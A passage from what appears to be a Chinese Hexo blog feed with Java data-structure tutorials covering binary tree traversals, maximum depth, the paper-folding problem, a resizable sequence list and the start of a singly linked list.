<h3 id="（2）中序遍历"><a href="#（2）中序遍历" class="headerlink" title="（2）中序遍历"></a>（2）中序遍历</h3><p>我们在（3）中创建的树上，添加中序遍历的API： </p>
<blockquote>
<ul>
<li><code>public Deque&lt;Key&gt; midErgodic()</code>：使用中序遍历，获取整个树中的所有键 </li>
<li><code>private void midErgodic(Node x, Deque&lt;Key&gt; keys)</code>：使用中序遍历，把指定树x中的所有键放入到keys队列中</li>
</ul>
</blockquote>
<blockquote>
<p><strong>实现步骤：</strong></p>
<ol>
<li>找到当前结点的左子树，如果不为空，递归遍历左子树</li>
<li>把当前结点的key放入到队列中</li>
<li>找到当前结点的右子树，如果不为空，递归遍历右子树</li>
</ol>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 使用中序遍历获取树中所有的键</span></span><br><span class="line"><span class="keyword">public</span> Deque&lt;Key&gt; <span class="title function_">midErgodic</span><span class="params">()</span>&#123;</span><br><span class="line">	Deque&lt;Key&gt; keys = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">	midErgodic(root,keys);</span><br><span class="line">	<span class="keyword">return</span> keys;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用中序遍历，获取指定树x中所有的键，并存放到key中</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">midErgodic</span><span class="params">(Node x,Deque&lt;Key&gt; keys)</span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (x==<span class="literal">null</span>)&#123;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 先递归，把左子树中的键放到keys中</span></span><br><span class="line">	<span class="keyword">if</span> (x.left != <span class="literal">null</span>)&#123;</span><br><span class="line">		midErgodic(x.left, keys);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 把当前结点x的键放到keys中</span></span><br><span class="line">	keys.add(x.key);</span><br><span class="line">	<span class="comment">// 在递归，把右子树中的键放到keys中</span></span><br><span class="line">	<span class="keyword">if</span>(x.right != <span class="literal">null</span>)&#123;</span><br><span class="line">		midErgodic(x.right, keys);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="（3）后序遍历"><a href="#（3）后序遍历" class="headerlink" title="（3）后序遍历"></a>（3）后序遍历</h3><p>我们在（3）中创建的树上，添加后序遍历的API： </p>
<blockquote>
<p><code>public Deque&lt;Key&gt; afterErgodic()</code>：使用后序遍历，获取整个树中的所有键  <code>private void afterErgodic(Node x, Deque&lt;Key&gt; keys)</code>：使用后序遍历，把指定树x中的所有键放入到keys队列中</p>
</blockquote>
<blockquote>
<p><strong>实现步骤：</strong></p>
<ol>
<li>找到当前结点的左子树，如果不为空，递归遍历左子树</li>
<li>找到当前结点的右子树，如果不为空，递归遍历右子树</li>
<li>把当前结点的key放入到队列中;</li>
</ol>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 使用后序遍历，把整个树中所有的键返回</span></span><br><span class="line"><span class="keyword">public</span> Deque&lt;Key&gt; <span class="title function_">afterErgodic</span><span class="params">()</span>&#123;</span><br><span class="line">	Deque&lt;Key&gt; keys = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">	afterErgodic(root,keys);</span><br><span class="line">	<span class="keyword">return</span> keys;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用后序遍历，把指定树x中所有的键放入到keys中</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">afterErgodic</span><span class="params">(Node x,Deque&lt;Key&gt; keys)</span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (x == <span class="literal">null</span>)&#123;</span><br><span class="line">		<span class="keyword">return</span> ;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 通过递归把左子树中所有的键放入到keys中</span></span><br><span class="line">	<span class="keyword">if</span> (x.left != <span class="literal">null</span>)&#123;</span><br><span class="line">		afterErgodic(x.left, keys);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 通过递归把右子树中所有的键放入到keys中</span></span><br><span class="line">	<span class="keyword">if</span> (x.right != <span class="literal">null</span>)&#123;</span><br><span class="line">		afterErgodic(x.right, keys);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 把x结点的键放入到keys中</span></span><br><span class="line">	keys.add(x.key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="（4）层次遍历"><a href="#（4）层次遍历" class="headerlink" title="（4）层次遍历"></a>（4）层次遍历</h3><p>所谓的层序遍历，就是从根节点（第一层）开始，依次向下，获取每一层所有结点的值，有二叉树如下：<br><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815142604.png" alt="  "></p>
<p>那么层序遍历的结果是：<code>EBGADFHC</code><br>我们在（3）中创建的树上，添加层序遍历的API：</p>
<blockquote>
<ul>
<li><code>public Deque&lt;Key&gt; layerErgodic()</code>：使用层序遍历，获取整个树中的所有键</li>
</ul>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 使用层序遍历，获取整个树中所有的键</span></span><br><span class="line"><span class="keyword">public</span> Deque&lt;Key&gt; <span class="title function_">layerErgodic</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 定义两个队列，分别存储树中的键和树中的结点</span></span><br><span class="line">	Deque&lt;Key&gt; keys = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">	Deque&lt;Node&gt; nodes = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">	<span class="comment">// 默认，往队列中放入根结点</span></span><br><span class="line">	nodes.add(root);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">while</span>(!nodes.isEmpty())&#123;</span><br><span class="line">		<span class="comment">// 从队列中弹出一个结点，把key放入到keys中</span></span><br><span class="line">		<span class="type">Node</span> <span class="variable">n</span> <span class="operator">=</span> nodes.poll();</span><br><span class="line">		keys.add(n.key);</span><br><span class="line">		<span class="comment">// 判断当前结点还有没有左子结点，如果有，则放入到nodes中</span></span><br><span class="line">		<span class="keyword">if</span> (n.left != <span class="literal">null</span>)&#123;</span><br><span class="line">			nodes.add(n.left);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// 判断当前结点还有没有右子结点，如果有，则放入到nodes中</span></span><br><span class="line">		<span class="keyword">if</span> (n.right != <span class="literal">null</span>)&#123;</span><br><span class="line">			nodes.add(n.right);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> keys;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="5-最大深度问题"><a href="#5-最大深度问题" class="headerlink" title="5. 最大深度问题"></a>5. 最大深度问题</h2><p>给定一棵树，请计算树的最大深度（树的根节点到最远叶子结点的最长路径上的结点数）<br><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815142607.png" alt="  "></p>
<p>上面这棵树的最大深度为4。</p>
<p>我们在（3）中创建的树上，添加如下的API求最大深度：</p>
<blockquote>
<ul>
<li><code>public int maxDepth()</code>：计算整个树的最大深度 </li>
<li><code>private int maxDepth(Node x)</code>:计算指定树x的最大深度</li>
</ul>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//获取整个树的最大深度</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">maxDepth</span><span class="params">()</span>&#123;</span><br><span class="line">	<span class="keyword">return</span> maxDepth(root);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取指定树x的最大深度</span></span><br><span class="line"><span class="keyword">private</span> <span class="type">int</span> <span class="title function_">maxDepth</span><span class="params">(Node x)</span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (x == <span class="literal">null</span>)&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 比较左子树最大深度和右子树最大深度，取较大值+1即可</span></span><br><span class="line">	<span class="keyword">return</span> Math.max(maxDepth(x.left), maxDepth(x.right)) + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h2 id="6-折纸问题"><a href="#6-折纸问题" class="headerlink" title="6. 折纸问题"></a>6. 折纸问题</h2><p>请把一段纸条竖着放在桌子上，然后从纸条的下边向上方对折1次，压出折痕后展开。此时 折痕是凹下去的，即折痕突起的方向指向纸条的背面。如果从纸条的下边向上方连续对折2 次，压出折痕后展开，此时有三条折痕，从上到下依次是下折痕、下折痕和上折痕。<br>给定一 个输入参数N，代表纸条都从下边向上方连续对折N次，请从上到下打印所有折痕的方向<br>例如：N&#x3D;1时，打印： down；N&#x3D;2时，打印： down down up</p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815142610.png" alt="  "></p>
<p>我们把对折后的纸张翻过来，让粉色朝下，这时把第一次对折产生的折痕看做是根结点，那第二次对折产生的下折痕就是该结点的左子结点，而第二次对折产生的上折痕就是该结点的右子结点，这样我们就可以使用树型数据结构来描述对折后产生的折痕。</p>
<blockquote>
<p><strong>这棵树有这样的特点：</strong></p>
<ol>
<li>根结点为下折痕</li>
<li>每一个结点的左子结点为下折痕</li>
<li>每一个结点的右子结点为上折痕</li>
</ol>
</blockquote>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815142613.png" alt="  "></p>
<blockquote>
<p><strong>实现步骤：</strong></p>
<ol>
<li>定义结点类</li>
<li>构建深度为N的折痕树</li>
<li>使用中序遍历，打印出树中所有结点的内容</li>
</ol>
<hr>
<p><strong>构建深度为N的折痕树：</strong></p>
<ol>
<li>第一次对折，只有一条折痕，创建根结点；</li>
<li>如果不是第一次对折，则使用队列保存根结点；</li>
<li>循环遍历队列</li>
</ol>
<ul>
<li>从队列中拿出一个结点；</li>
<li>如果这个结点的左子结点不为空，则把这个左子结点添加到队列中；</li>
<li>如果这个结点的右子结点不为空，则把这个右子结点添加到队列中；</li>
<li>判断当前结点的左子结点和右子结点都不为空，如果是，则需要为当前结点创建一个值为down的左子结点，一个值为up的右子结点</li>
</ul>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Deque;</span><br><span class="line"><span class="keyword">import</span> java.util.LinkedList;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PagerFoldingTest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 模拟折纸过程，产生树</span></span><br><span class="line">        Node&lt;String&gt; tree = createTree(<span class="number">3</span>);</span><br><span class="line">        <span class="comment">// 遍历树，打印每个结点</span></span><br><span class="line">        printTree(tree);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 通过模拟对折 N 次纸，产生树</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Node&lt;String&gt; <span class="title function_">createTree</span><span class="params">(<span class="type">int</span> N)</span>&#123;</span><br><span class="line">        <span class="comment">// 定义根结点</span></span><br><span class="line">        Node&lt;String&gt; root = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; N; i++) &#123;</span><br><span class="line">            <span class="comment">// 当前是第一次对折</span></span><br><span class="line">            <span class="keyword">if</span> (i == <span class="number">0</span>)&#123;</span><br><span class="line">                root = <span class="keyword">new</span> <span class="title class_">Node</span>&lt;&gt;(<span class="string">&quot;down&quot;</span>,<span class="literal">null</span>,<span class="literal">null</span>);</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 当前不是第一次对折</span></span><br><span class="line">            <span class="comment">// 定义一个辅助队列，通过层序遍历的思想，找到叶子结点，叶子结点添加子节点</span></span><br><span class="line">            Deque&lt;Node&gt; queue = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">            queue.add(root);</span><br><span class="line">            <span class="comment">// 循环遍历队列</span></span><br><span class="line">            <span class="keyword">while</span>(!queue.isEmpty())&#123;</span><br><span class="line">                <span class="comment">// 从队列中弹出一个结点</span></span><br><span class="line">                Node&lt;String&gt; tmp = queue.poll();</span><br><span class="line">                <span class="comment">// 如果有左子结点，则把左子结点放入到队列中</span></span><br><span class="line">                <span class="keyword">if</span> (tmp.left != <span class="literal">null</span>)&#123;</span><br><span class="line">                    queue.add(tmp.left);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// 如果有右子结点，则把右子结点放入到队列中</span></span><br><span class="line">                <span class="keyword">if</span> (tmp.right != <span class="literal">null</span>)&#123;</span><br><span class="line">                    queue.add(tmp.right);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// 如果同时没有左子结点和右子结点，那么证明该节点是叶子结点，只需要给该节点添加左子结点和右子结点即可</span></span><br><span class="line">                <span class="keyword">if</span> (tmp.left == <span class="literal">null</span> &amp;&amp; tmp.right == <span class="literal">null</span>)&#123;</span><br><span class="line">                    tmp.left = <span class="keyword">new</span> <span class="title class_">Node</span>&lt;String&gt;(<span class="string">&quot;down&quot;</span>, <span class="literal">null</span>,<span class="literal">null</span>);</span><br><span class="line">                    tmp.right = <span class="keyword">new</span> <span class="title class_">Node</span>&lt;String&gt;(<span class="string">&quot;up&quot;</span>,<span class="literal">null</span>,<span class="literal">null</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 打印树中每个结点到控制台</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">printTree</span><span class="params">(Node&lt;String&gt; root)</span>&#123;</span><br><span class="line">        <span class="comment">// 使用中序遍历完成</span></span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 打印左子树的每个结点</span></span><br><span class="line">        <span class="keyword">if</span> (root.left != <span class="literal">null</span>)&#123;</span><br><span class="line">            printTree(root.left);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 打印当前结点</span></span><br><span class="line">        System.out.print(root.item + <span class="string">&quot; &quot;</span>);</span><br><span class="line">        <span class="comment">// 打印右子树的每个结点</span></span><br><span class="line">        <span class="keyword">if</span> (root.right != <span class="literal">null</span>)&#123;</span><br><span class="line">            printTree(root.right);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 结点类</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Node</span>&lt;T&gt;&#123;</span><br><span class="line">        <span class="comment">// 存储元素</span></span><br><span class="line">        <span class="keyword">public</span> T item;</span><br><span class="line">        <span class="keyword">public</span> Node left;</span><br><span class="line">        <span class="keyword">public</span> Node right;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">Node</span><span class="params">(T item, Node left, Node right)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.item = item;</span><br><span class="line">            <span class="built_in">this</span>.left = left;</span><br><span class="line">            <span class="built_in">this</span>.right = right;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>技术笔记</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>数据结构</tag>
      </tags>
  </entry>
  <entry>
    <title>Java数据结构-线性表</title>
    <url>/posts/fde62576.html</url>
    <content><![CDATA[<h1 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h1><p>线性表是最基本、最简单、也是最常用的一种数据结构。一个线性表是n个具有相同特性的数据元素的有限序列。<br><strong>前驱元素：</strong><br>若A元素在B元素的前面，则称A为B的前驱元素<br><strong>后继元素：</strong><br>若B元素在A元素的后面，则称B为A的后继元素</p>
<blockquote>
<p><strong>线性表的特征：</strong><br>数据元素之间具有一种“一对一”的逻辑关系。</p>
<ol>
<li>第一个数据元素没有前驱，这个数据元素被称为头结点；</li>
<li>最后一个数据元素没有后继，这个数据元素被称为尾结点；</li>
<li>除了第一个和最后一个数据元素外，其他数据元素有且仅有一个前驱和一个后继。 如果把线性表用数学语言来定义，则可以表示为(a1,…ai-1,ai,ai+1,…an)，ai-1领先于ai,ai领先于ai+1，称ai-1是ai的前驱元素，ai+1是ai的后继元素</li>
</ol>
</blockquote>
<p><strong>线性表的分类：</strong><br>线性表中数据存储的方式可以是顺序存储，也可以是链式存储，按照数据的存储方式不同，可以把线性表分为顺序表和链表。</p>
<hr>
<h1 id="二、顺序表实现"><a href="#二、顺序表实现" class="headerlink" title="二、顺序表实现"></a>二、顺序表实现</h1><p> 顺序表是计算机内存中以数组的形式保存的线性表，线性表的顺序存储是指用一组地址连续的存储单元，依次存储线性表中的各个元素，使得线性表中在逻辑结构上相邻的数据元素存储在相邻的物理存储单元中，即通过数据元素物理存储的相邻关系来反映数据元素之间逻辑上的相邻关系。<br> <img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815143008.png" alt="  "><strong>顺序表API设计</strong><br><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815143010.png" alt="  "></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Iterator;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    顺序表的实现</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SequenceList</span>&lt;T&gt; <span class="keyword">implements</span> <span class="title class_">Iterable</span>&lt;T&gt;&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 存储元素的数组</span></span><br><span class="line">    <span class="keyword">private</span> T[] elements;</span><br><span class="line">    <span class="comment">// 记录当前顺序表中的元素个数</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> N;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 构造方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">SequenceList</span><span class="params">(<span class="type">int</span> capacity)</span>&#123;</span><br><span class="line">        <span class="comment">// 初始化数组</span></span><br><span class="line">        <span class="built_in">this</span>.elements = (T[]) <span class="keyword">new</span> <span class="title class_">Object</span>[capacity];</span><br><span class="line">        <span class="comment">// 初始化长度</span></span><br><span class="line">        <span class="built_in">this</span>.N = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将一个线性表置为空表</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">clear</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.N = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 判断当前线性表是否为空表</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isEmpty</span><span class="params">()</span>&#123;</span><br><span class="line">       <span class="keyword">return</span> N == <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取线性表的长度</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">length</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> N;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取指定位置的元素</span></span><br><span class="line">    <span class="keyword">public</span> T <span class="title function_">get</span><span class="params">(<span class="type">int</span> i)</span>&#123;</span><br><span class="line">        <span class="comment">// 安全性校验</span></span><br><span class="line">        <span class="keyword">if</span> (i &lt; <span class="number">0</span> || i &gt;= N)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">return</span> elements[i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 向线型表中添加元素t</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">insert</span><span class="params">(T t)</span>&#123;</span><br><span class="line">        <span class="comment">// 当前容量已不足，准备扩容，此处设定扩大 2 倍</span></span><br><span class="line">        <span class="keyword">if</span> (N == elements.length)&#123;</span><br><span class="line">            resize(<span class="number">2</span> * elements.length);</span><br><span class="line">        &#125;</span><br><span class="line">        elements[N++] = t;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在 i 索引处插入元素t</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">insert</span><span class="params">(<span class="type">int</span> i, T t)</span>&#123;</span><br><span class="line">        <span class="comment">// 安全性校验</span></span><br><span class="line">        <span class="keyword">if</span> (i &lt; <span class="number">0</span> || i &gt;= N)</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        <span class="keyword">if</span> (N == elements.length)&#123;</span><br><span class="line">            resize(<span class="number">2</span> * elements.length);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 先把i索引处的元素及其后面的元素依次向后移动一位</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> N; index &gt; i; index--)&#123;</span><br><span class="line">            elements[index] = elements[index-<span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 再把t元素放到i索引处即可</span></span><br><span class="line">        elements[i] = t;</span><br><span class="line">        <span class="comment">// 元素个数+1</span></span><br><span class="line">        N ++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 删除指定位置i处的元素，并返回该元素</span></span><br><span class="line">    <span class="keyword">public</span> T <span class="title function_">remove</span><span class="params">(<span class="type">int</span> i)</span>&#123;</span><br><span class="line">        <span class="comment">// 安全性校验</span></span><br><span class="line">        <span class="keyword">if</span> (i &lt; <span class="number">0</span> || i &gt;= N)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="comment">// 记录索引i处的值</span></span><br><span class="line">        <span class="type">T</span> <span class="variable">current</span> <span class="operator">=</span> elements[i];</span><br><span class="line">        <span class="comment">// 索引i后面元素依次向前移动一位即可</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> i; index &lt; N - <span class="number">1</span>; index++)&#123;</span><br><span class="line">            elements[index] = elements[index + <span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 元素个数-1</span></span><br><span class="line">        N --;</span><br><span class="line">        <span class="keyword">if</span> (N &lt; elements.length / <span class="number">4</span>)&#123;</span><br><span class="line">            resize(elements.length / <span class="number">2</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> current;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 查找t元素第一次出现的位置</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">indexOf</span><span class="params">(T t)</span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; N; i++)&#123;</span><br><span class="line">            <span class="keyword">if</span> (elements[i].equals(t))&#123;</span><br><span class="line">                <span class="keyword">return</span> i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 根据参数newSize，重置 elements 的大小</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">resize</span><span class="params">(<span class="type">int</span> newSize)</span>&#123;</span><br><span class="line">        <span class="comment">// 定义一个临时数组，指向原数组</span></span><br><span class="line">        T[] temp = elements;</span><br><span class="line">        <span class="comment">// 创建新数组</span></span><br><span class="line">        elements = (T[])<span class="keyword">new</span> <span class="title class_">Object</span>[newSize];</span><br><span class="line">        <span class="comment">//把原数组的数据拷贝到新数组即可</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; N; i++)&#123;</span><br><span class="line">            elements[i] = temp[i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	重写iterator方法 实现顺序表的遍历</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Iterator&lt;T&gt; <span class="title function_">iterator</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">MyIterator</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">class</span> <span class="title class_">MyIterator</span> <span class="keyword">implements</span> <span class="title class_">Iterator</span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="type">int</span> cusor;</span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">MyIterator</span><span class="params">()</span>&#123;</span><br><span class="line">            <span class="built_in">this</span>.cusor = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">hasNext</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> cusor &lt; N;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> Object <span class="title function_">next</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> elements[cusor++];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h1 id="三、链表"><a href="#三、链表" class="headerlink" title="三、链表"></a>三、链表</h1><p>链表是一种物理存储单元上非连续，非顺序的存储结构，其物理结构不能只管的表示数据元素的逻辑结构，数据元素的逻辑顺序是通过链表中的指针链接次序实现的。链表由一系列的节点(链表中的每一个元素称为节点)组成，结点可以在运行时动态产生。</p>
<p><strong>节点API设计</strong><br><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815143014.png" alt="  "></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">结点类</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Node</span> &#123;</span><br><span class="line">	<span class="comment">// 存储数据</span></span><br><span class="line">	T item;</span><br><span class="line">	<span class="comment">// 下一个结点</span></span><br><span class="line">	Node next;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> <span class="title function_">Node</span><span class="params">(T item, Node next)</span> &#123;</span><br><span class="line">		<span class="built_in">this</span>.item = item;</span><br><span class="line">		<span class="built_in">this</span>.next = next;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="1-单向链表实现"><a href="#1-单向链表实现" class="headerlink" title="1.  单向链表实现"></a>1.  单向链表实现</h2><p>单向链表是链表的一种，它由多个结点组成，每个结点都由一个数据域和一个指针域组成，数据域用来存储数据，指针域用来指向其后继结点。链表的头结点的数据域不存储数据，指针域指向第一个真正存储数据的结点。<br><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815143016.png" alt="  "><br><strong>单向链表API设计</strong></p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815143018.png" alt="  "></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Iterator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LinkList</span>&lt;T&gt; <span class="keyword">implements</span> <span class="title class_">Iterable</span>&lt;T&gt;&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     结点类</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">class</span> <span class="title class_">Node</span> &#123;</span><br><span class="line">        <span class="comment">// 存储数据</span></span><br><span class="line">        T item;</span><br><span class="line">        <span class="comment">// 下一个结点</span></span><br><span class="line">        Node next;</span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">Node</span><span class="params">(T item, Node next)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.item = item;</span><br><span class="line">            <span class="built_in">this</span>.next = next;</span><br><span class="line">        &#125;</span><br><span 